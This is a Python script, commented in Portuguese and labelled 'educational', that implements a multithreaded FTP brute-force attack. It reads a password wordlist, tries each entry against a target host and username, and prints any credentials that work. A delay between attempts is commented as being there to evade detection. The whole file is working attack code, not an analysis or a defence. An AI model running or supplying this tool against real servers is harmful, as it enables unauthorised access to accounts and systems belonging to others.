
import ftplib
import threading
import time
import argparse
from datetime import datetime

def ftp_brute_force(host, username, password, port=21, timeout=10):
    """
    Tenta fazer login no servidor FTP com credenciais específicas
    """
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, port, timeout)
        ftp.login(username, password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        print(f"Erro de conexão: {e}")
        return False

def worker(host, username, passwords, port, timeout, results, delay=1):
    """
    Worker thread para tentar múltiplas senhas
    """
    for password in passwords:
        if ftp_brute_force(host, username, password.strip(), port, timeout):
            results.append((username, password.strip()))
            print(f"[+] CREDENCIAIS ENCONTRADAS: {username}:{password.strip()}")
            return
        else:
            print(f"[-] Falha: {username}:{password.strip()}")
        time.sleep(delay)  # Delay para evitar detecção

def main():
    parser = argparse.ArgumentParser(description='FTP Brute Force (Educacional)')
    parser.add_argument('host', help='Endereço do servidor FTP')
    parser.add_argument('-u', '--user', help='Nome de usuário', required=True)
    parser.add_argument('-w', '--wordlist', help='Arquivo de wordlist', required=True)
    parser.add_argument('-p', '--port', help='Porta FTP', default=21, type=int)
    parser.add_argument('-t', '--threads', help='Número de threads', default=5, type=int)
    parser.add_argument('-d', '--delay', help='Delay entre tentativas', default=0.5, type=float)
    
    args = parser.parse_args()
   ###
    print(f"""
    FTP Brute Force Tool (Educacional)
    Alvo: {args.host}:{args.port}
    Usuário: {args.user}
    Wordlist: {args.wordlist}
    Threads: {args.threads}
    Iniciado em: {datetime.now()}
    """)

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.readlines()
    except FileNotFoundError:
        print(f"[-] Wordlist não encontrada: {args.wordlist}")
        return

    print(f"[+] Carregadas {len(passwords)} senhas da wordlist")

    # Dividir wordlist entre threads
    chunk_size = len(passwords) // args.threads
    password_chunks = [passwords[i:i + chunk_size] for i in range(0, len(passwords), chunk_size)]

    results = []
    threads = []

    print("[+] Iniciando brute force...")

    for chunk in password_chunks:
        if not chunk:
            continue
        thread = threading.Thread(
            target=worker,
            args=(args.host, args.user, chunk, args.port, 10, results, args.delay)
        )
        threads.append(thread)
        thread.start()

    # Aguardar todas as threads
    for thread in threads:
        thread.join()

    # Resultados
    print(f"\n[+] Scan finalizado em: {datetime.now()}")
    if results:
        print(f"[+] Credenciais válidas encontradas:")
        for username, password in results:
            print(f"    {username}:{password}")
    else:
        print("[-] Nenhuma credencial válida encontrada")

if __name__ == "__main__":
    main()